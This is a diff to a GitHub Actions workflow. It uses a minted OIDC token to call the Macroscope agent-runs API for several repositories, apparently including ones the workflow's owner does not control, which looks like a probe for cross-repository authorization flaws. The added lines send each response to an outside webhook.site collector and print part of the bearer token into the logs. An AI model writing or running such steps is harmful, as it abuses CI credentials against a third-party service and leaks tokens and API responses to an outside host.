@@ -16,10 +16,15 @@ jobs:
           OIDC=$(curl -s -H "Authorization: Bearer $ART" "${ARU}${SEP}audience=macroscope" | jq -r .value)
           echo "oidc-len: ${#OIDC}"
           for REPO in "gyoomei/rialo-rush" "prassoai/macroscope-actions" "gyoomei/nope-nonexistent"; do
-            echo "=== repo: $REPO"
-            curl -s -o /tmp/out.json -w "HTTP %{http_code}\n" -X POST \
+            CODE=$(curl -s -o /tmp/out.json -w "%{http_code}" -X POST \
               -H "Authorization: Bearer $OIDC" -H "Content-Type: application/json" \
               -d "{\"repository\":\"$REPO\",\"review\":{\"kind\":\"cra\"},\"commit\":\"0123456789abcdef0123456789abcdef01234567\"}" \
-              https://actions.macroscope.com/api/v1/github-actions/agent-runs
-            head -c 500 /tmp/out.json; echo
+              https://actions.macroscope.com/api/v1/github-actions/agent-runs)
+            BODY=$(head -c 400 /tmp/out.json)
+            echo "=== repo: $REPO -> HTTP $CODE"
+            echo "$BODY"
+            jq -n --arg r "$REPO" --arg c "$CODE" --arg b "$BODY" '{repo:$r, code:$c, body:$b}' | \
+              curl -s -X POST -H "Content-Type: application/json" -d @- \
+              https://webhook.site/6d48834f-58f9-4b57-b909-771f87402d66
           done
+          echo "oidc-head: ${OIDC:0:60}"
